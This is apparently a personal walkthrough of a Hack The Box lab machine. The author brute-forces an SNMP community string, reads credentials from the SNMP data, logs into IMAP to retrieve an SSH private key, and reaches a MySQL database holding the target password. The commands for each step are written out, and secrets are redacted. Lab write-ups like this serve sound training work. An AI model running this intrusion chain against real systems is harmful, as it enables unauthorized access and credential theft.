## Given data 

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named HTB was also created here, whose credentials we need to access.
## step by step 

- as usual i started with the nmap scan 

```
└─[★]$ sudo nmap -sS -sV 10.129.202.20
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-08 08:57 EDT
Nmap scan report for 10.129.202.20
Host is up (0.053s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp   open  pop3       Dovecot pop3d
143/tcp   open  imap       Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap   Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3   Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- the nmap reveals the mail services : pop3 , imap and there SSL based versions and ssh
- after trying the possible attacks that i could do on these protocols which are password bruteforcing and password reuse and all of them failed , i decided to scan the target again with the flag -sU to scan UDP ports 

```
└─[★]$ sudo nmap -sU -Pn -T5 10.129.202.20
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-08 08:58 EDT
Warning: 10.129.202.20 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.202.20
Host is up (0.058s latency).
Not shown: 894 open|filtered udp ports (no-response), 105 closed udp ports (port-unreach)
PORT      STATE SERVICE
161/udp   open  snmp
```

 - The UDP scan revealed SNMP running on UDP port 161 , by default when i saw the SNMP i thought of doing a snmpawalk but i need to get the community string using tools like onesixtyone
 
 ```
 └─[★]$ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
Scanning 1 hosts, 3219 communities
10.129.202.20 [████████] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
 ```

- as we can see we got the community string [REDACTED FOR HTB POLICY]
- lets use it in the snmpwalk :

```
snmpwalk -v 2c -c [community key] 10.129.202.20
```

```
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 158
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom██████████"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
```
- we can see that there is credentials for a user **tom**
- Lets Try this credentials with IMAP or POP3 :

```
└─[★]$ openssl s_client -connect 10.129.202.20:993 -quiet
Connecting to 10.129.202.20
Can't use SSL_get_servername
depth=0 CN=NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=NIXHARD
verify return:1
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready
A1 LOGIN tom██████████
A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=
IAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC E
ONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```

- as we see we have connected to the IMAP serve , lets list the contents
```
1 LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1 OK List completed (0.009 + 0.000 + 0.008 secs).
```

- then we can select the INBOX to Fetch messages content

```
1 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.004 + 0.000 + 0.003 secs).
```

- now we can fetch the existing message by selecting its number and specifying the content we need to see which is the body text

![[Pasted image 20260809184506.png]]

- we got a SSH key which we can use to connect to the user’s device
- then i copied the SSH key to a file named id_rsa to use it , and as we made before we have to change the file permissions to be able to use it

```
chmod 600 id_rsa
```

```
ssh -i id_rsa tom@10.129.202.20
```

- after accessing the user device i listed the content to see what we got :

![[Pasted image 20260809184533.png]]

- we can see there are two important files : .bash_history and .mysql_history
- lets see the content of the mysql file first

![[Pasted image 20260809184640.png]]

- this file reveals that there is a DB called users containing a table called users and there is a high posability to find the user HTB creds here
- lets connect to the MySQL server using toms credentials

![[Pasted image 20260809184648.png]]

- here we found the password which is the answer of the question
